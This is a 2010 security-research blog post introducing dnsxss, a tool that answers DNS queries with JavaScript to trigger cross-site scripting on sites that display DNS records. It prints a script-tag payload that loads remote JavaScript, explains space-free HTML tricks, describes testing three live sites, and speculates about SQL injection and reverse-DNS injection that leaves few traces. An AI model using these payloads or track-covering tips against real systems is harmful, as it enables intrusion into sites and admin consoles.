---
id: 433
title: 'Stuffing Javascript into DNS names'
date: '2010-04-20T10:36:54-05:00'
author: 'Ron Bowes'
layout: post
guid: 'http://www.skullsecurity.org/blog/?p=433'
permalink: /2010/stuffing-javascript-into-dns-names
categories:
    - DNS
    - Hacking
    - Tools
---

Greetings! 

Today seemed like a fun day to write about a really cool vector for cross-site scripting I found. In my testing, this attack is pretty specific and, in some ways, useless, but I strongly suspect that, with resources I don't have access to, this can trigger stored cross-site scripting in some pretty nasty places. But I'll get to that! 

Interestingly enough, between the time that I wrote this blog/tool and published it, nCircle researchers <a href='http://www.darkreading.com/vulnerability_management/security/app-security/showArticle.jhtml?articleID=224201569'>have said almost the same thing</a> (<a href='http://blog.ncircle.com/blogs/vert/miXSS%20Whitepaper.pdf'>paper</a> (pdf)). The major difference is, I released a tool to do it and demonstrate actual examples. 
<!--more-->
<h2>dnsxss</h2>
If you've installed <a href='/wiki/index.php/Nbtool'>nbtool</a>, you may have noticed that, among other programs it comes with, one of them is called <a href='/wiki/index.php/Dnsxss'>dnsxss</a>. Take a look at the wiki page for more information, but what it does is, essentially, respond to DNS requests for CNAME, MX, TXT, and NS records with Javascript code. Unless you want some specific code, all you have to do is run it:
<pre># dnsxss
Listening for requests on 0.0.0.0:53
Will response to queries with: 
&lt;script/src='http://www.skullsecurity.org/test-js.js'&gt;&lt;/script&gt;
</pre>

Pass -h or --help for a list of arguments. 

Now, an observant reader will realize that this isn't valid HTML. Unfortunately, as far as I can tell, there's no way to send a space through DNS, so you have to come up with some space-free code. The best I could find was replacing spaces with a '/', which will work on Firefox but not IE (I haven't tested anything else). If anybody can think of a better way to write HTML without spaces, let me know. The next best solution is using the TXT query, which DOES allow spaces. dnsxss will reply to TXT queries with well formed Javascript. 

For what it's worth, dnsxss will answer A or AAAA requests with localhost (127.0.0.1 or ::1) -- if somebody does a lookup, they'll get an odd answer that won't immediately lead back to you. 

<h2>Let's break stuff!</h2>
So, what can you do with this?

Well, fortunately (or unfortunately? depends who you are), most sites don't echo back DNS records. But, some do. I picked the first three sites from a Google query and tested them out. All three were vulnerable. And I very much doubt that any programmers even *consider* filtering DNS responses. I mean, who expects DNS responses to contain HTML? 

And, furthermore, if I can sneak HTML code into pretty much any site that looks up DNS names due to lack of filtering, how about SQL injection? If the response is inserted into the database without filtering for SQL characters, which I would bet they are on at least some sites, you now have an avenue for SQL injection! And, better yet, there's a decent chance that the requests won't be logged because a) it's coming through a backchannel so it's not going to be in their Web server logs, b) the statements containing SQL injection won't be inserted to your logging table (since they wouldn't be valid queries), and c) you can turn off the DNS server whenever you want, and no trace will be left that you were ever doing it (except short-lived caches). 

As I mentioned earlier, I took the first three sites from a google query I crafted, and all three were vulnerable. I emailed the administrators of all three sites, and two of them replied thanking me. Both told me that it was a really interesting vector, and that they would fix their sites as soon as possible. The third I haven't heard back from. But the point is, on three random sites, none had even considered implementing any defenses.

Let's take a look at the examples! But first, here are some notes on them:
<ul>
<li>The examples use skullseclabs.org, which is the domain I use for all my testing -- if you plan on testing these yourself, you'll have to register your own domain</li>
<li>The examples use "/* */" to conceal the space, but I realized later that a single "/" works just as well</li>
</ul>

So, without further ado, here are some screenshots of the sites. I anonymized them a little, though a clever attacker could likely Google hack them. 
<h3>Site 1</h3>
The form:
<img src='/blogdata/dnsxss-site1-1.png'>

The result:
<img src='/blogdata/dnsxss-site1-2.png'>

The source:
<img src='/blogdata/dnsxss-site1-3.png'>

<h3>Site 2</h3>
The form:
<img src='/blogdata/dnsxss-site2-1.png'>

The result:
<img src='/blogdata/dnsxss-site2-2.png'>

The source:
<img src='/blogdata/dnsxss-site2-3.png'>

<h3>Site 3</h3>
The form:
<img src='/blogdata/dnsxss-site3-1.png'>

The result:
<img src='/blogdata/dnsxss-site3-2.png'>

The source:
<img src='/blogdata/dnsxss-site3-3.png'>

<h3>So there we go...</h3>
Three sites, none of which filter out my cross-site scripting attempts. Fun!

<h2>Weaponization</h2>
The problem is, this only affects a small percentage of sites -- those that will look up domains and display them for you. How can this be used against more targets?

Well, I have two ideas:
<ol>
<li>As I mentioned earlier, I'd bet money that there are other forms of attacks through these avenues -- I'd be surprised if SQL injection didn't exist</li>
<li>Can you stuff javascript into <strong>reverse</strong> DNS entries?</li>
</ol>

The second point, I suspect, is where we're going to have fun. I can think of countless security devices, from firewalls to vulnerability management tools to proxy servers, with Web interfaces that display reverse DNS records. Not to mention tools where administrators are shown reverse lookups -- forums, for example. Another avenue is logfiles, which are normally visible to administrators. 

In all of these cases, if you can stuff Javascript into reverse DNS lookups, you will likely find some very interesting vulnerabilities. Plus, you can instantly see when somebody hits one, and, more often than not, you can clean up your tracks quite well. 

I don't have access to any domains where I control the reverse DNS records, but if anybody does I'd love to test this out! 
